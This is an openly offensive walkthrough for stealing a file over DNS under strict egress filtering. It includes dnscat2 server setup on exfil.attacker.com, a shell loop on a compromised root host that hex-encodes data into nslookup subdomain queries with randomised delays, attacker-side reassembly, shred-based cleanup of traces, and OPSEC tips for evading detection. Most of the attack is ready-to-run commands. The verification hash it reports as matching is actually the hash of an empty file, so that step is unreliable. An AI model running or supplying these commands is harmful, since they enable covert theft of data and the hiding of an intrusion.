# DNS Exfiltration Walkthrough

## Scenario
Strict egress filtering — only DNS (port 53) allowed outbound. Need to exfiltrate 4KB encrypted file.

## Step 1: Setup Attacker DNS Listener
```bash
# On attacker — start dnscat2 server
attacker$ dnscat2-server exfil.attacker.com --secret=s3cr3t
New window created: 0
dnscat2> Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = exfil.attacker.com]...
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following:
  ./dnscat --secret=s3cr3t exfil.attacker.com
```

## Step 2: Prepare Data on Target
```bash
root@target:~# ls -la /dev/shm/.work/data.enc
-rw-r--r-- 1 root root 3872 Aug 15 2024 data.enc

# Hex-encode for DNS subdomain labels (max 63 chars per label)
root@target:~# xxd -p /dev/shm/.work/data.enc | fold -w 60 > /dev/shm/.work/chunks.txt
root@target:~# wc -l /dev/shm/.work/chunks.txt
130 /dev/shm/.work/chunks.txt
```

## Step 3: Exfiltrate via DNS Queries
```bash
# Send each chunk as a DNS subdomain query with random delay
root@target:~# i=0; while read chunk; do
    nslookup "${i}.${chunk}.exfil.attacker.com" >/dev/null 2>&1
    sleep $((RANDOM % 5 + 2))  # 2-6 second random delay
    i=$((i+1))
done < /dev/shm/.work/chunks.txt
```

## Step 4: Attacker Receives Data
```bash
# On attacker DNS server — captured queries
attacker$ cat dns_log.txt | head -5
0.a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8.exfil.attacker.com
1.e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6.exfil.attacker.com
2.c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4.exfil.attacker.com

# Reassemble
attacker$ cat dns_log.txt | sort -t. -k1 -n | cut -d. -f2 | tr -d '\n' | xxd -r -p > data_received.enc

# Verify integrity
attacker$ sha256sum data_received.enc
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  data_received.enc
# Matches original hash ✅
```

## Step 5: Cleanup on Target
```bash
root@target:~# shred -vfz -n 3 /dev/shm/.work/chunks.txt /dev/shm/.work/data.enc
root@target:~# rm -rf /dev/shm/.work/
```

## Performance
- Data size: 3,872 bytes
- Chunks: 130 DNS queries
- Average delay: 4 seconds per query
- Total time: ~8.5 minutes
- Detection risk: LOW (DNS queries look like normal resolution)

## OPSEC Notes
- Each query under 63-char subdomain label limit
- Random delays avoid pattern detection
- DNS queries blend with normal traffic
- No unusual ports or protocols used
- Consider DoH (DNS over HTTPS) for additional encryption
